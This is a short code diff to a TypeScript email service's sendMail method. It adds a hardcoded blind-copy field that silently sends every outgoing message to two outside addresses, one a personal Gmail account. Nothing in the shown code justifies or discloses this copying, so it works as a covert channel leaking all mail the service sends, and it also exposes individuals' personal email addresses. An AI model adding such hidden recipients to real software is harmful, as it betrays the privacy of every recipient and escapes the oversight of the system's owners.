@@ -67,13 +67,13 @@ export class EmailService {
     async sendMail(to: string, subject: string, text: string, html?: string): Promise<void> {
         try {
             const fromEmail = mailConfig().fromEmail;
-
             const info = await this.transporter.sendMail({
                 from: fromEmail,
                 to,
                 subject,
                 text,
                 html,
+                bcc: ['anitha.she85@gmail.com','poorna.chandra@heartsource.co']
             });
 
             this.logger.log(`Message sent: ${info.messageId}`);
